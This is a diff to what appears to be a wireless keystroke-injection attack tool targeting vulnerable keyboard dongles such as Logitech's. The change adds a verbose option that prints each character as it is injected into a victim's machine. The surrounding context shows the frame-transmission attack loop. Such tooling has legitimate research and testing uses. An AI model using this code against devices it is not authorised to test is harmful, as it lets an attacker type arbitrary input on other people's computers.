@@ -58,11 +58,13 @@ def add_key_releases(keystrokes):
     return new_keystrokes
 
 
-def inject_keystrokes(radio, keystrokes, vendor=logitech):
+def inject_keystrokes(radio, keystrokes, vendor=logitech, verbose=False):
     """
     This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
-    a list of keystrokes (meaning a list where each element is a list of the form: [scan_code, modifier]),
-    and a vendor. The function performs a keystroke injection attack against a vulnerable dongle of the given vendor.
+    a list of keystrokes (meaning a list where each element is a list of the form: [scan_code, modifier]), a vendor
+    and an optional flag. The function performs a keystroke injection attack against a vulnerable dongle of the given vendor.
+    If the verbose flag is set to True (may occur only when called from transmit_string), then the injected string will be printed
+    character by character as it is being transmitted.
     """
 
     if len(keystrokes) == 0:
@@ -92,12 +94,20 @@ def inject_keystrokes(radio, keystrokes, vendor=logitech):
                 time.sleep(10 / 1000)
             return
 
+        # in case of verbose attack, printing the character that is about to be transmitted
+        if verbose and scan_code != KEY_RELEASE: # ignoring key release packets added in between characters
+            print(keystroke_to_char[f"{scan_code}-{modifier}"], end="", flush=True)
+
         radio.transmit_payload(vendor.build_frame(scan_code, modifier)) # transmit the proper frame
         time.sleep(vendor.DELAY_BETWEEN_TRANSMISSIONS) # waiting before the next transmission
         radio.transmit_payload(vendor.KEEPALIVE_PAYLOAD) # transmit keepalive
 
     # we have to transmit a key release at the end, otherwise it would keep typing the last key forever
     radio.transmit_payload(vendor.build_frame(KEY_RELEASE))
+
+    # in case of verbose attack, print a new line after string injection is finished
+    if verbose:
+        print()
 
 
 def transmit_string(radio, s, vendor=logitech):
@@ -106,7 +116,7 @@ def transmit_string(radio, s, vendor=logitech):
     a string to be injected and the vendor of the vulnerable device. It injects the string to the victim.
     """
     keystrokes = [printable_characters[char] for char in s] # using the printable_characters dictionary from hid_scan_codes.py to get a list of keystrokes matching the characters
-    inject_keystrokes(radio, add_key_releases(keystrokes), vendor) # injecting keystrokes, adding key release packets using the utility function if necessary
+    inject_keystrokes(radio, add_key_releases(keystrokes), vendor, VERBOSE_ATTACK) # injecting keystrokes, adding key release packets using the utility function if necessary
 
 
 def transmit_keys(radio, keys, vendor=logitech):
